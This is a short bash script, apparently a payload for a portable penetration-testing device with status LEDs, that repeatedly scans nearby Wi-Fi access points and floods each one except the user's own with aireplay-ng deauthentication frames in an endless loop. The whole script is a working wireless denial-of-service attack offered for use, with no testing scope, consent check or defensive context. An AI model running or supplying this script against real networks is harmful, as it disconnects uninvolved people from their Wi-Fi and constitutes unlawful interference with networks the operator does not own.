#!/bin/bash

function scan() {
    LED G
    ifconfig wlan0 down
    iwconfig wlan0 mode managed
    ifconfig wlan0 up
    AP_LIST=$(iwlist wlan0 scan | grep Address | awk '{ print $5 }')
}

function attack() {
    ifconfig wlan0 down
    iwconfig wlan0 mode monitor
    ifconfig wlan0 up
    LED R
    for a in $AP_LIST
    do
        if [ $a != $YOUR_AP_MAC ]; then
            aireplay-ng -0 20 -a $a wlan0
        fi
    done
    LED B
    sleep 10
    scan
    attack
}

[[ -f '/usr/sbin/aireplay-ng' ]] || opkg install aircrack-ng

LED SETUP
AP_LIST=''
YOUR_AP_MAC='something'
scan
attack
